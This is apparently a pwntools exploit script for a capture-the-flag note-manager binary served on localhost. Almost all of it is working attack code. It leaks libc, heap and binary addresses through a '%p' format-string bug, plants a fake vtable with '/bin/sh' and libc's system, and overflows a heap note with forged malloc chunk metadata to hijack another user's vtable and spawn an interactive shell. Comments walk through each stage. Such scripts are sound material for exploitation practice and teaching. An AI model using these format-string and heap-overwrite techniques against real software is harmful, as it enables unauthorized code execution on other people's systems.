#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = exe.process()
    elif args.GDB:
        return gdb.debug(exe.process(), 
        gdbscript="""
        b *view_notes_impl
        continue
        """
        )
    else:
        r = remote("localhost", 1337)

    return r

def register(r, name):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Username: ", name)

def login(r, name):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"username: ", name)

def create_note(r, idx, content):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendafter(b"Content: ", content)

def edit_note(r, idx, content):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendlineafter(b"content: ", content)

def view_one(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"index: ", str(idx).encode())

def view_all(r):
    r.sendlineafter(b"> ", b"4")

def logout(r):
    r.sendlineafter(b"> ", b"5")

def main():

    """
    Here we setup the challenge with initial user and session
    """
    r = conn()
    register(r, b"lalaleen")
    login(r, b"lalaleen")

    """
    Since create note accept 64 byte of content we write leaker of size 60
    To leak:
    - libc (or libc adjacent)
    - heap (in this case note 0 location on the heap achieved though dangling pointer from len)
    - exe (snprintf still hold the base caller)
    """
    create_note(r,0,b"%p"*30)
    view_one(r,0)
    r.recvuntil(b": ")
    leaks = r.recvline().decode().strip().replace("0x",".0x").replace("(nil)",".(nil).").replace("..",".").split(".")


    libc_leak = int(leaks[21],16)
    note0_addr = int(leaks[5],16)
    exe_base_leak = int(leaks[6],16)

    log.info("Libc Base: " + hex(libc_leak - 0x213580))
    log.info("Exe Base: " + hex(exe_base_leak - 0x1476))
    log.info("Heap Leak: " + hex(note0_addr))


    libc.address = libc_leak - 0x213580
    exe.address = exe_base_leak - 0x1476

    
    """
    Since recon return good results we have full freedom on what kind of exploit we want to write
    In this case our approach is hijacking Vtable of second user by overwriting it with other value
    """
    logout(r)
    register(r, b"gg")
    login(r, b"gg")
    
    """
    We create a syscall but using second user notes, the index may be zero but inside the program
    it is counted as 1, with fixed distance of 0x80 because continuous assignment in source code
    """
    fake_vtable_payload = b"/bin/sh\x00" + p64(libc.sym['system'])
    create_note(r, 0, fake_vtable_payload)
    
    note1_addr = note0_addr + 0x80 

    """
    This is where the fun begins, we logout of our victim and make the first victim edit her note
    note 0 inside program to moved note 0 allocated location to overwrite victim user vtable
    to instead be his own notes that system addr and args prepped inside it

    Extra care need to be taken because of libc 2.43. 
    First, because we overwrite malloc with arbitarty values heap metadata will also be rewritten 
    malloc metadata has the format of [ prev_size curr_size ] because this is arbitrary call inside user
    we must tell malloc that current size is 0x31 because user struct size is 0x30 
    + prev inuse bit which is 0x1 to prevent merging
    and prev_size of 0
    Second, victim user name can also be overwritten, to bypass strcmp
    we uses null char 
    Last, note 1 address is added by 8 in order to skip the syscall args
    """
    logout(r)
    login(r, b"lalaleen")

    payload = b"A" * 64
    payload += p64(0) + p64(0x31)
    payload += b"gg\x00".ljust(24, b"A")
    payload += p64(note1_addr + 8) 

    edit_note(r, 0, payload)

    """
    To trigger the exploit it's as easy as changing session to victim and call any func
    that uses view_note_impl, in this case we use view one note of user 1
    """
    logout(r)
    login(r, b"gg")
    
    log.success("Triggering Shell...")
    view_one(r, 0)

    r.interactive()

if __name__ == "__main__":
    main()